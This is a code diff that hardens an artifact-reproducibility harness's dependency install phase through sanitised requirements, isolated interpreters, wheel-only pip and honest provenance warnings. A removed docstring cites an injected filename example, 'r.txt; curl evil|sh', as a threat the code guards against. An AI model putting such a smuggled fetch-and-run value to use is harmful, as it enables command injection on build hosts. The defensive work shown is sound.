@@ -7,17 +7,35 @@ Decision rule (see docs/DESIGN.md §3):
     --allow-repo2docker and repo complex -> repo2docker build   [repo2docker]
     otherwise                            -> pinned-base best-effort + warn
 
-For the MVP the pinned-base path is implemented; repo2docker is a documented
-Phase-2 hook. The report always records ``env_provenance`` so a reviewer knows
-whether the environment was author-specified or harness-default.
+The pinned-base path is the only one implemented. ``--allow-repo2docker`` is
+accepted and says plainly that no repo2docker build happens; a plan never claims
+a builder that did not run. The report always records ``env_provenance`` so a
+reviewer knows whether the environment was author-specified or harness-default.
+
+THE INSTALL PHASE HAS NETWORK EGRESS, so what it is asked to run is decided here:
+
+* the artifact's own code is never executed — no ``install.R`` (its package lists
+  are read statically instead), no ``-e .``, no ``git+``/URL requirements;
+* the artifact's dependency files are reduced to plain package requirements
+  (``sanitize.py``), and the sanitised text is what is embedded in the command;
+* every harness Python runs ``-I`` (cwd and PYTHONPATH off ``sys.path``, so a
+  committed ``pip.py`` or ``sitecustomize.py`` is never imported), every Rscript
+  runs ``--vanilla`` (no author ``.Rprofile``/``.Renviron``);
+* each command carries an ORIGIN — ``author-declared`` (their file),
+  ``harness-detected`` (an import or ``library()`` reprobe inferred) or
+  ``harness-record`` (a version listing) — so a failed install is attributed to
+  whoever asked for it.
+
+What still runs with network is third-party package build code (an sdist's
+``setup.py``, a conda post-link script) from the public indexes the plan allows.
 """
 
 from __future__ import annotations
 
 import re
-import shlex
 import shutil
 import sys
+from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any, Optional
 
@@ -26,6 +44,28 @@ import yaml
 from ..config import Config
 from ..docker_exec import docker_available, image_present
 from ..models import DetectResult, EnvPlan
+from .sanitize import (
+    DEFAULT_CONDA_CHANNELS,
+    MAX_EMBED_BYTES,
+    classify_renv_lock,
+    embed_file_command,
+    filter_requirements,
+    inside_tree,
+    sanitize_conda_env,
+)
+
+# Origins of an install command (see the module docstring).
+AUTHOR = "author-declared"
+DETECTED = "harness-detected"
+RECORD = "harness-record"
+
+#: Where the sanitised copies of the artifact's dependency files are written in
+#: the install container. Never read from the artifact's own tree.
+_REQ_DIR = "/work/.reprobe_req"
+#: micromamba/pip find user config under $HOME, and HOME is /work — the artifact's
+#: own directory. A separate, empty HOME keeps an author's .condarc/.mambarc from
+#: choosing channels for the build.
+INSTALL_HOME = "/var/tmp/reprobe-home"
 
 
 def _needs(kinds: set[str], *want: str) -> bool:
@@ -35,10 +75,22 @@ def _needs(kinds: set[str], *want: str) -> bool:
 # Same invocation for manifest-declared and auto-detected lockfiles: guarded so
 # an image without renv fails loudly (non-zero -> install noted failed/skipped)
 # instead of a cryptic traceback or a silent "ok".
-_RENV_RESTORE = ("Rscript -e 'if (requireNamespace(\"renv\", quietly=TRUE)) renv::restore(prompt=FALSE) "
-                 "else { message(\"renv not preinstalled in image; renv.lock NOT restored\"); quit(status=3) }'")
+def _renv_restore_command(cran_repo: str, excluded: list[str]) -> str:
+    """Restore an renv.lock from the pinned CRAN snapshot, minus every package the
+    lockfile sources from somewhere else (GitHub, a URL, a local path).
 
-_R_VERSIONS = "Rscript -e 'print(installed.packages()[, c(\"Package\", \"Version\")])'"
+    ``--vanilla``: the project's ``.Rprofile`` (renv's activate.R, plus whatever
+    else the author put there) is not sourced during the network phase. The
+    packages land in renv's project library, which the offline run — which does
+    start from the project directory — then uses."""
+    repo = cran_repo or "https://cloud.r-project.org"
+    excl = "c(" + ", ".join(f'"{n}"' for n in excluded) + ")" if excluded else "NULL"
+    return ("Rscript --vanilla -e 'if (requireNamespace(\"renv\", quietly=TRUE)) "
+            f'renv::restore(prompt=FALSE, repos=c(CRAN=\"{repo}\"), exclude={excl}) '
+            "else { message(\"renv not preinstalled in image; renv.lock NOT restored\"); quit(status=3) }'")
+
+
+_R_VERSIONS = "Rscript --vanilla -e 'print(installed.packages()[, c(\"Package\", \"Version\")])'"
 
 
 def _cran_packages(env: dict[str, Any], detected: list[str]) -> list[str]:
@@ -95,7 +147,15 @@ def _cran_install_command(packages: list[str], cran_repo: str) -> str:
         'print(installed.packages()[, c("Package", "Version")]); quit(status=1) } '
         "}"
     )
-    return "Rscript -e '" + r_code + "'"
+    return "Rscript --vanilla -e '" + r_code + "'"
+
+
+def _py(conda_prefix: Optional[str]) -> str:
+    """The interpreter the harness itself runs in the install phase: ``-I`` keeps
+    the artifact's directory (cwd) and PYTHONPATH off ``sys.path``, so a committed
+    ``pip.py``, ``subprocess.py`` or ``sitecustomize.py`` is never imported by
+    the one process in the pipeline that has network."""
+    return f"{conda_prefix}/bin/python -I" if conda_prefix else "python -I"
 
 
 def _py_detected_install_command(dists: list[str], conda_prefix: Optional[str]) -> str:
@@ -107,25 +167,43 @@ def _py_detected_install_command(dists: list[str], conda_prefix: Optional[str]) 
     touched; and a name PyPI does not have is *reported*, never faked and never
     fatal — a mis-detected local module must not fail the phase.
 
+    These names are GUESSES made from import statements, and an unregistered name
+    is one anyone can register. So nothing a package ships may RUN while the network
+    is open:
+
+    * **wheels only** (``--only-binary=:all:``): no sdist ``setup.py``/build backend;
+    * **download first, install once**: ``pip download`` fetches each wheel (and its
+      dependency closure) without installing anything, then ONE ``pip install
+      --no-index`` installs them all. A wheel's ``.pth`` file is executed at the NEXT
+      interpreter start in the environment, so installing package by package (each
+      its own pip process) let an earlier squatted package run code in the next pip
+      call. A single install leaves no later process in this phase;
+    * pip runs from an empty directory, never the artifact's.
+
+    A package that ships no wheel is reported as not installed.
+
     Distribution names are pre-validated to ``[A-Za-z0-9][A-Za-z0-9._-]*`` and
     module names to an identifier, so embedding them in the double-quoted Python
     literals inside this single-quoted ``-c`` argument cannot inject shell or
-    Python code."""
-    from ..detect.signatures import _PY_IMPORT_TO_DIST
+    Python code. (The code therefore uses no single quotes.)"""
+    from ..detect.signatures import py_module_for_dist
 
-    inverse = {v: k for k, v in _PY_IMPORT_TO_DIST.items()}
     # An extra gets an empty module name, which the generated code treats as
     # "always offer to pip". A presence check cannot answer for an extra:
     # find_spec("ray.tune") succeeds on the file layout alone, while importing
     # it still raises because ray[tune]'s dependencies are absent — which is the
     # exact failure this mapping exists to fix. pip is idempotent, so offering
     # an already-satisfied extra costs a no-op.
-    pairs = [("" if "[" in d else inverse.get(d, d.replace("-", "_")), d) for d in dists]
+    pairs = [("" if "[" in d else py_module_for_dist(d), d) for d in dists]
     spec = ", ".join(f'("{m}", "{d}")' for m, d in pairs)
-    py = f"{conda_prefix}/bin/python" if conda_prefix else "python"
     target = ', "--target=/work/.reprobe_deps"' if not conda_prefix else ""
     code = (
-        "import importlib.util as u, importlib.metadata as md, subprocess, sys; "
+        # -I drops PYTHONPATH, so earlier installs into /work/.reprobe_deps are
+        # added back explicitly (after the stdlib, never before it). The working
+        # directory is moved off the artifact's tree before any pip process starts.
+        'import sys, os; sys.path.append("/work/.reprobe_deps"); '
+        'os.makedirs("/var/tmp/reprobe-pip", exist_ok=True); os.chdir("/var/tmp/reprobe-pip"); '
+        "import importlib.util as u, importlib.metadata as md, subprocess; "
         f"pairs = [{spec}]; "
         'norm = lambda s: s.lower().replace("_", "-"); '
         # Two independent presence checks: the module may be importable without
@@ -135,11 +213,15 @@ def _py_detected_install_command(dists: list[str], conda_prefix: Optional[str]) 
         "need = sorted({d for m, d in pairs "
         "if not m or (u.find_spec(m) is None and norm(d) not in have)}); "
         'print("reprobe: imports the environment does not provide:", need or "none", flush=True); '
-        "fail = [d for d in need if subprocess.call([sys.executable, \"-m\", \"pip\", "
-        f'"install", "--no-input"{target}, d]) != 0]; '
+        'W = "/var/tmp/reprobe-wheels"; '
+        'run = lambda *a: subprocess.call([sys.executable, "-I", "-m", "pip", *a]); '
+        'got = [d for d in need if run("download", "--no-input", "--only-binary=:all:", "-d", W, d) == 0]; '
+        f'bad = bool(got) and run("install", "--no-input", "--no-index", "--only-binary=:all:", '
+        f'"--find-links", W{target}, *got) != 0; '
+        'fail = [d for d in need if d not in got] + (got if bad else []); '
         'print("reprobe: pip could NOT install (reported, not faked):", fail or "none")'
     )
-    return f"{py} -c '{code}'"
+    return f"{_py(conda_prefix)} -c '{code}'"
 
 
 def plan(
@@ -166,27 +248,30 @@ def plan(
     image_key = "python" if py_needed or not r_needed else "r"
     image = config.base_image(image_key) or config.pins.get("fetch", {}).get("fallback_python_image", "")
 
-    install, dep_warnings, conda_prefix = _install_commands(
+    ip = _install_plan(
         env, src, r_needed,
         detected_r_packages=detect_result.r_packages,
         cran_repo=config.cran_repo,
         executes_code=bool(detect_result.steps),
         notebooks=_needs(kinds, "jupyter"),
         py_needed=py_needed,
-        detected_py_packages=detect_result.py_packages)
+        detected_py_packages=detect_result.py_packages,
+        conda_channels=tuple((config.pins.get("install") or {}).get("conda_channels")
+                             or DEFAULT_CONDA_CHANNELS))
+    install, dep_warnings, conda_prefix = ip.commands, ip.warnings, ip.conda_prefix
 
     flags = detect_result.flags
-    if ("needs-repo2docker" in flags or builder == "repo2docker") and allow_repo2docker:
-        # Phase 2: hand off to repo2docker_builder. For now, record intent.
-        return EnvPlan(strategy="repo2docker", image=image, env_provenance="repo2docker-built",
-                       install_commands=install, conda_env_prefix=conda_prefix,
-                       repo2docker_version=config.pins.get("tools", {}).get("repo2docker"),
-                       warnings=["repo2docker builder is a Phase-2 hook; using pinned base best-effort"]
-                                + dep_warnings)
-
     strategy = "pinned-base"
     warnings = []
-    if builder == "repo2docker":
+    if ("needs-repo2docker" in flags or builder == "repo2docker") and allow_repo2docker:
+        # Not built — and not claimed. Recording "repo2docker-built" with a
+        # repo2docker version here told the report's reader an environment came
+        # from a builder that never ran.
+        warnings.append("--allow-repo2docker was given, but this build of reprobe has no "
+                        "repo2docker builder: nothing was built by repo2docker, and the pinned "
+                        "base image was used best-effort")
+        strategy = "besteffort"
+    elif builder == "repo2docker":
         strategy = "besteffort"
         warnings.append("author requested builder: repo2docker; not built in this run — "
                         "re-run with --allow-repo2docker")
@@ -197,7 +282,8 @@ def plan(
     if "needs-repo2docker" in flags:
         strategy = "besteffort"
         warnings.append("repo declares system-level setup (Dockerfile/postBuild/apt.txt); "
-                        "pinned base may lack some deps. Re-run with --allow-repo2docker for fidelity.")
+                        "pinned base may lack some deps, and reprobe has no repo2docker builder to "
+                        "supply them")
 
     # Pinned base declared but not present locally: fall back to the generic
     # image (python stacks only — there is no generic R fallback) rather than
@@ -215,8 +301,8 @@ def plan(
                             "applies — steps will report an infra error, not an artifact failure")
 
     return EnvPlan(strategy=strategy, image=image, env_provenance=provenance,
-                   install_commands=install, conda_env_prefix=conda_prefix,
-                   warnings=warnings + dep_warnings)
+                   install_commands=install, install_origins=ip.origins,
+                   conda_env_prefix=conda_prefix, warnings=warnings + dep_warnings)
 
 
 #: Where the install phase builds an artifact's own conda environment. Under
@@ -245,7 +331,8 @@ def _case_insensitive(path: Path) -> bool:
         shutil.rmtree(probe, ignore_errors=True)
 
 
-def _conda_env_command(env_file: str, notebooks: bool) -> str:
+def _conda_env_commands(src: Path, env_file: str, notebooks: bool,
+                        channels: tuple[str, ...]) -> tuple[Optional[str], list[str]]:
     """Build the artifact's declared conda environment with micromamba.
 
     The pinned base IS a micromamba image, so the environment an artifact
@@ -255,8 +342,29 @@ def _conda_env_command(env_file: str, notebooks: bool) -> str:
     declared (`ModuleNotFoundError: torch` against an environment.yml listing
     ultralytics).
 
-    The env file is author-controlled and reaches a `bash -c`, so quote it."""
+    The file is SANITISED first (see sanitize.py): channels outside the allow-list,
+    URL/path/archive specs and VCS or custom-index lines in its ``pip:`` section are
+    dropped and reported, and micromamba reads the sanitised copy this command
+    writes — not the author's file. Returns ``(command_or_None, warnings)``."""
+    if not inside_tree(src, src / env_file):
+        return None, [f"'{env_file}' is outside the artifact (or a symbolic link); the declared "
+                      "conda environment was NOT built"]
+    try:
+        spec = yaml.safe_load((src / env_file).read_text(encoding="utf-8", errors="replace"))
+    except (OSError, yaml.YAMLError) as e:
+        return None, [f"'{env_file}' could not be read as YAML ({type(e).__name__}); the declared "
+                      "conda environment was NOT built"]
+    clean, dropped = sanitize_conda_env(spec, channels)
+    warnings = _dropped_warnings(env_file, dropped)
+    content = yaml.safe_dump(clean, sort_keys=False)
+    if len(content.encode("utf-8")) > MAX_EMBED_BYTES:
+        return None, warnings + [f"'{env_file}' is too large to embed in the install command; "
+                                 "the declared conda environment was NOT built"]
+    dest = f"{_REQ_DIR}/environment.yml"
+    mm = f"HOME={INSTALL_HOME} micromamba"
     parts = [
+        embed_file_command(content, dest),
+        f"mkdir -p {INSTALL_HOME} && cd {INSTALL_HOME}",
         # The cache MUST NOT live on /work. /work is a host bind mount, and on a
         # Windows or macOS host that filesystem folds case — while micromamba's
         # package cache is integrity-checked file-for-file. ncurses (a hard
@@ -268,16 +376,28 @@ def _conda_env_command(env_file: str, notebooks: bool) -> str:
         # torch-sized download would overflow. It is per-container and therefore
         # not reused across runs; correctness first.
         f"export MAMBA_ROOT_PREFIX={_MAMBA_CACHE}",
-        f"micromamba create -y -q -p {CONDA_ENV_PREFIX} -f {shlex.quote(env_file)}",
+        f"{mm} create -y -q -p {CONDA_ENV_PREFIX} -f {dest}",
     ]
     if notebooks:
         # papermill/ipykernel live in the BASE image, not in the artifact's env.
         # Without them here the notebook runner would find the base image's
         # papermill on PATH and execute the notebook against the wrong
         # interpreter — the one environment.yml exists to replace.
-        parts.append(f"micromamba install -y -q -p {CONDA_ENV_PREFIX} -c conda-forge "
+        parts.append(f"{mm} install -y -q -p {CONDA_ENV_PREFIX} -c conda-forge "
                      "papermill ipykernel nbconvert")
-    return " && ".join(parts)
+    return " && ".join(parts), warnings
+
+
+def _dropped_warnings(name: str, dropped: list[tuple[str, str]]) -> list[str]:
+    """One warning naming what was NOT applied from a dependency file, and why."""
+    if not dropped:
+        return []
+    shown = "; ".join(f"`{line[:70]}` ({why})" for line, why in dropped[:8])
+    more = f"; … and {len(dropped) - 8} more" if len(dropped) > 8 else ""
+    return [f"{len(dropped)} entr{'y' if len(dropped) == 1 else 'ies'} in '{name}' were NOT applied "
+            f"in the install phase, which has network access and so only takes plain package "
+            f"requirements from public indexes: {shown}{more}. The environment was built "
+            "without them."]
 
 
 def lint_requirements(path: Path) -> list[str]:
@@ -314,16 +434,33 @@ def lint_requirements(path: Path) -> list[str]:
     return findings
 
 
-def _pip_command(req_file: str, conda_prefix: Optional[str]) -> str:
-    """`pip install -r <file>`, into a built conda env when there is one.
+def _requirements_command(src: Path, req_file: str,
+                          conda_prefix: Optional[str]) -> tuple[Optional[str], list[str]]:
+    """`pip install -r <sanitised copy>`, into a built conda env when there is one.
 
-    ``req_file`` may be an untrusted manifest-declared filename that later
-    reaches a `bash -c`; shell-quote it (POSIX, for the Linux install container)
-    so a name like ``r.txt; curl evil|sh`` cannot inject a command."""
-    quoted = shlex.quote(req_file)
-    if conda_prefix:
-        return f"{conda_prefix}/bin/pip install --no-input -r {quoted}"
-    return f"pip install --no-input --target=/work/.reprobe_deps -r {quoted}"
+    The author's requirements file is filtered (sanitize.filter_requirements): an
+    editable install, a ``git+``/URL requirement or a custom index would run the
+    author's code, or fetch from the author's server, in a phase with network. What
+    remains is embedded in the command and written to ``/work/.reprobe_req/``, so
+    pip never reads the author's file. The path is a harness constant; the file
+    NAME is never interpolated into the shell. Returns ``(command_or_None, warnings)``."""
+    path = src / req_file
+    if not inside_tree(src, path):
+        return None, [f"'{req_file}' is outside the artifact (or a symbolic link); it was NOT read"]
+    kept, dropped = filter_requirements(path, src)
+    warnings = _dropped_warnings(req_file, dropped)
+    if not kept:
+        return None, warnings + ([f"nothing installable remained in '{req_file}'"] if dropped else [])
+    content = "\n".join(kept) + "\n"
+    if len(content.encode("utf-8")) > MAX_EMBED_BYTES:
+        return None, warnings + [f"'{req_file}' is too large to embed in the install command; it was "
+                                 "NOT installed"]
+    dest = f"{_REQ_DIR}/requirements.txt"
+    target = "" if conda_prefix else " --target=/work/.reprobe_deps"
+    # cd first: pip reads a requirement ending in an archive suffix as a file in ITS
+    # working directory, which must not be the artifact's tree
+    return (f"{embed_file_command(content, dest)} && cd {_REQ_DIR} && "
+            f"{_py(conda_prefix)} -m pip install --no-input{target} -r {dest}"), warnings
 
 
 def _conda_disclosures(path: Path, notebooks: bool) -> list[str]:
@@ -354,6 +491,42 @@ def _conda_disclosures(path: Path, notebooks: bool) -> list[str]:
     return out
 
 
+def describe_install_command(cmd: str) -> str:
+    """What an install command DOES, in words an author recognises. The command
+    itself embeds a sanitised copy of their file as base64, which is useless in a
+    report — and showing a truncated blob read as a harness bug."""
+    if "-r /work/.reprobe_req/requirements.txt" in cmd:
+        return "pip install -r requirements.txt (the sanitised copy)"
+    if "micromamba create" in cmd:
+        return "micromamba create from environment.yml (the sanitised copy)"
+    if "renv::restore" in cmd:
+        return "renv::restore of renv.lock"
+    if "install.packages(ok" in cmd:
+        pkgs = re.search(r"pkgs <- c\(([^)]*)\)", cmd)
+        names = pkgs.group(1).replace('"', "") if pkgs else ""
+        return f"install of CRAN packages ({names[:60]}{'…' if len(names) > 60 else ''})"
+    if "reprobe: imports the environment" in cmd:
+        return "install of the imports found in the code"
+    if "pip freeze" in cmd or "micromamba list" in cmd or "installed.packages()[, c(" in cmd:
+        return "listing of installed versions"
+    return cmd[:60]
+
+
+@dataclass
+class _InstallPlan:
+    """The install commands, who asked for each, and what was not applied."""
+
+    commands: list[str] = field(default_factory=list)
+    origins: list[str] = field(default_factory=list)
+    warnings: list[str] = field(default_factory=list)
+    conda_prefix: Optional[str] = None
+
+    def add(self, cmd: Optional[str], origin: str) -> None:
+        if cmd:
+            self.commands.append(cmd)
+            self.origins.append(origin)
+
+
 def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
                       detected_r_packages: list[str] | tuple[str, ...] = (),
                       cran_repo: str = "",
@@ -362,60 +535,123 @@ def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
                       py_needed: bool = False,
                       detected_py_packages: list[str] | tuple[str, ...] = (),
                       ) -> tuple[list[str], list[str], Optional[str]]:
-    """Returns (commands, warnings). Any declared or detected dependency file
-    the pinned-base builder does NOT install must surface as a warning — the
-    report says what was not installed (never over-claim)."""
-    cmds: list[str] = []
-    warnings: list[str] = []
-    conda_prefix: Optional[str] = None
+    """``(commands, warnings, conda_prefix)`` — see :func:`_install_plan` for the
+    per-command origins."""
+    ip = _install_plan(env, src, r_needed, detected_r_packages, cran_repo, executes_code,
+                       notebooks, py_needed, detected_py_packages)
+    return ip.commands, ip.warnings, ip.conda_prefix
+
+
+def _install_plan(env: dict[str, Any], src: Path, r_needed: bool,
+                  detected_r_packages: list[str] | tuple[str, ...] = (),
+                  cran_repo: str = "",
+                  executes_code: bool = False,
+                  notebooks: bool = False,
+                  py_needed: bool = False,
+                  detected_py_packages: list[str] | tuple[str, ...] = (),
+                  conda_channels: tuple[str, ...] = DEFAULT_CONDA_CHANNELS) -> _InstallPlan:
+    """Any declared or detected dependency file the pinned-base builder does NOT
+    install must surface as a warning — the report says what was not installed
+    (never over-claim)."""
+    ip = _InstallPlan()
+    uses_pip_target = False
+    handled = False          # a supported, existing manifest dependency file was applied
     dep = str(env.get("dependencies") or "")
+    if dep and not inside_tree(src, src / dep):
+        # a manifest path of `../x` or an absolute path names a file on the chair's
+        # machine, and its first lines would have been echoed into the report
+        ip.warnings.append("manifest declares a dependencies path outside the artifact; it was "
+                           "ignored and the artifact's own files were auto-detected instead")
+        dep = ""
+
+    def requirements(rel: str, conda_prefix: Optional[str]) -> None:
+        nonlocal uses_pip_target
+        cmd, w = _requirements_command(src, rel, conda_prefix)
+        ip.warnings.extend(w)
+        ip.add(cmd, AUTHOR)
+        uses_pip_target = uses_pip_target or (cmd is not None and not conda_prefix)
+
+    def conda(rel: str) -> None:
+        cmd, w = _conda_env_commands(src, rel, notebooks, conda_channels)
+        ip.warnings.extend(w)
+        if cmd:
+            ip.add(cmd, AUTHOR)
+            ip.conda_prefix = CONDA_ENV_PREFIX
+            ip.warnings.extend(_conda_disclosures(src / rel, notebooks))
+
+    def renv(rel: str) -> None:
+        lock = src / rel
+        if not inside_tree(src, lock):
+            ip.warnings.append(f"'{rel}' is outside the artifact (or a symbolic link); R "
+                               "dependencies were NOT restored from it")
+            return
+        try:
+            text = lock.read_text(encoding="utf-8", errors="replace")
+        except OSError:
+            ip.warnings.append(f"'{rel}' could not be read; R dependencies were NOT restored from it")
+            return
+        excluded, notes = classify_renv_lock(text)
+        ip.warnings.extend(_dropped_warnings(rel, notes))
+        if excluded is None:                    # refused: nothing is restored from it
+            return
+        ip.add(_renv_restore_command(cran_repo, excluded), AUTHOR)
+
     # explicit manifest dependency file
     if dep and not (src / dep).exists():
-        warnings.append(f"manifest declares dependencies '{dep}' but the file does not exist; "
-                        "auto-detecting instead")
+        ip.warnings.append(f"manifest declares dependencies '{dep}' but the file does not exist; "
+                           "auto-detecting instead")
     elif dep.endswith(".txt"):
-        cmds.append(_pip_command(dep, None))
+        handled = True
+        requirements(dep, None)
     elif dep.endswith("renv.lock"):
-        cmds.append(_RENV_RESTORE)
+        handled = True
+        renv(dep)
     elif dep.endswith((".yml", ".yaml")):
-        cmds.append(_conda_env_command(dep, notebooks))
-        conda_prefix = CONDA_ENV_PREFIX
-        warnings.extend(_conda_disclosures(src / dep, notebooks))
+        handled = True
+        conda(dep)
         if (src / "requirements.txt").is_file():
             # repo2docker applies both, and so do the authors of repos that ship
             # both. Install it INTO the env — a --target install would land on
             # PYTHONPATH, which precedes site-packages and would shadow the very
             # environment the manifest declared.
-            cmds.append(_pip_command("requirements.txt", conda_prefix))
+            requirements("requirements.txt", ip.conda_prefix)
     elif dep:
-        warnings.append(f"declared dependency file '{dep}' is not a supported type "
-                        "(requirements.txt | environment.yml | renv.lock); it was NOT installed")
+        ip.warnings.append(f"declared dependency file '{dep}' is not a supported type "
+                           "(requirements.txt | environment.yml | renv.lock); it was NOT installed")
     # Read the file before spending an install phase on it: one unsatisfiable
     # line means nothing installs, and the resulting error names an innocent
     # package. Cheap, offline, and it fires whether or not the file is declared.
-    if (src / "requirements.txt").is_file():
-        warnings.extend(lint_requirements(src / "requirements.txt"))
-    if not cmds:
+    if (src / "requirements.txt").is_file() and inside_tree(src, src / "requirements.txt"):
+        ip.warnings.extend(lint_requirements(src / "requirements.txt"))
+    if not ip.commands and not handled:
         # auto-detect common manifests (repo2docker-style conventions). Conda
         # first: when there is an env to build, pip has to install INTO it.
         conda_file = next((c for c in ("environment.yml", "environment.yaml",
                                        "binder/environment.yml") if (src / c).is_file()), None)
         if conda_file:
-            cmds.append(_conda_env_command(conda_file, notebooks))
-            conda_prefix = CONDA_ENV_PREFIX
-            warnings.extend(_conda_disclosures(src / conda_file, notebooks))
+            conda(conda_file)
         if (src / "requirements.txt").is_file():
-            cmds.append(_pip_command("requirements.txt", conda_prefix))
+            requirements("requirements.txt", ip.conda_prefix)
         if (src / "renv.lock").is_file():
             if r_needed:
-                cmds.append(_RENV_RESTORE)
+                renv("renv.lock")
             else:
-                warnings.append("renv.lock present but no R steps detected; R dependencies were NOT restored")
-        elif (src / "install.R").is_file():
+                ip.warnings.append("renv.lock present but no R steps detected; R dependencies were "
+                                   "NOT restored")
+        if (src / "install.R").is_file():
             if r_needed:
-                cmds.append("Rscript install.R")
+                # NEVER executed: it is the author's code, and this is the phase with
+                # network. Its install.packages() lists were already read statically
+                # (they are in the detected R packages below), so the CRAN packages
+                # it names are still installed — from the pinned snapshot. Said even
+                # when an renv.lock is restored too: it is not run either way.
+                ip.warnings.append(
+                    "install.R was NOT executed: it is the artifact's own code and the install phase "
+                    "has network access. The packages its install.packages() calls name were read "
+                    "statically and are installed from the pinned CRAN snapshot instead; anything "
+                    "else it does (system setup, GitHub installs, data downloads) was not done")
             else:
-                warnings.append("install.R present but no R steps detected; it was NOT run")
+                ip.warnings.append("install.R present but no R steps detected; it was NOT run")
     # CRAN packages the base image lacks: author-declared (manifest r_packages)
     # + statically detected library()/require()/pkg:: usages. The install itself
     # picks only the CRAN-available, not-already-present subset (see
@@ -424,13 +660,18 @@ def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
     cran_pkgs = _cran_packages(env, list(detected_r_packages))
     if cran_pkgs:
         if r_needed:
-            cmds.append(_cran_install_command(cran_pkgs, cran_repo))
+            declared = _cran_packages(env, [])
+            detected = [n for n in cran_pkgs if n not in declared]
+            if declared:
+                ip.add(_cran_install_command(declared, cran_repo), AUTHOR)
+            if detected:
+                ip.add(_cran_install_command(detected, cran_repo), DETECTED)
             if not cran_repo:
-                warnings.append("no r.cran_snapshot pinned in pins.yaml; detected R packages install "
-                                "from a live CRAN mirror (versions not reproducible across time)")
+                ip.warnings.append("no r.cran_snapshot pinned in pins.yaml; detected R packages install "
+                                   "from a live CRAN mirror (versions not reproducible across time)")
         else:
-            warnings.append(f"R packages {cran_pkgs} were declared/detected but no R steps were found; "
-                            "they were NOT installed")
+            ip.warnings.append(f"R packages {cran_pkgs} were declared/detected but no R steps were "
+                               "found; they were NOT installed")
 
     # Python imports the code reaches for but no manifest declares. Same policy
     # as the CRAN block above: install only what the environment lacks, report
@@ -440,22 +681,25 @@ def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
     py_pkgs = [str(d) for d in (detected_py_packages or [])]
     if py_pkgs:
         if py_needed:
-            cmds.append(_py_detected_install_command(py_pkgs, conda_prefix))
+            ip.add(_py_detected_install_command(py_pkgs, ip.conda_prefix), DETECTED)
+            uses_pip_target = uses_pip_target or not ip.conda_prefix
             # State what the install phase was ASKED to do, not what it achieved.
             # This warning is composed while the plan is built, before any
             # container has run — claiming "were installed" here asserted an
             # outcome that a killed install phase then contradicted, in the very
             # report that had to explain the failure.
-            warnings.append(
+            ip.warnings.append(
                 f"{len(py_pkgs)} Python import(s) were detected statically; the install phase was "
-                "asked to add only those the environment does not already provide: "
+                "asked to add only those the environment does not already provide, as wheels only, "
+                "downloaded first and installed in one step (nothing a package ships runs while the "
+                "network is open): "
                 + ", ".join(py_pkgs[:12]) + ("…" if len(py_pkgs) > 12 else "")
                 + ". Anything in that list the artifact's own manifest does not declare is a "
                   "reproducibility defect of the artifact, not of the harness — the install log "
                   "records which were actually missing and whether pip got them.")
         else:
-            warnings.append(f"Python packages {py_pkgs} were detected but no Python steps "
-                            "were found; they were NOT installed")
+            ip.warnings.append(f"Python packages {py_pkgs} were detected but no Python steps "
+                               "were found; they were NOT installed")
 
     # The silent case, and the most over-claimable one: the artifact declares NO
     # dependencies anywhere. Every library its code imports then comes from
@@ -465,7 +709,7 @@ def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
     # and a green step, which reads as "self-contained and reproducible".
     from ..detect.signatures import DEP_MANIFESTS
     if executes_code and not any((src / m).is_file() for m in DEP_MANIFESTS):
-        warnings.append(
+        ip.warnings.append(
             "the artifact declares NO dependency manifest (no requirements.txt, environment.yml, "
             "renv.lock, pyproject.toml, DESCRIPTION, ...). Every library its code uses came from the "
             "harness base image, whose contents are reprobe's choice and change between years — so a "
@@ -473,10 +717,11 @@ def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
             "code may fail on a different base. This is a reproducibility defect of the artifact.")
 
     # record resolved versions in the install log so two runs are comparable
-    if any(c.startswith("pip install") for c in cmds):
-        cmds.append("pip freeze --path=/work/.reprobe_deps")
-    if any(c.startswith("Rscript") for c in cmds):
-        cmds.append(_R_VERSIONS)
-    if conda_prefix:
-        cmds.append(f"micromamba list -p {CONDA_ENV_PREFIX}")   # resolved versions into the log
-    return cmds, warnings, conda_prefix
+    if uses_pip_target:
+        ip.add(f"{_py(None)} -m pip freeze --path=/work/.reprobe_deps", RECORD)
+    if any(c.startswith("Rscript") for c in ip.commands):
+        ip.add(_R_VERSIONS, RECORD)
+    if ip.conda_prefix:
+        ip.add(f"mkdir -p {INSTALL_HOME} && cd {INSTALL_HOME} && "
+               f"HOME={INSTALL_HOME} micromamba list -p {CONDA_ENV_PREFIX}", RECORD)   # versions into the log
+    return ip
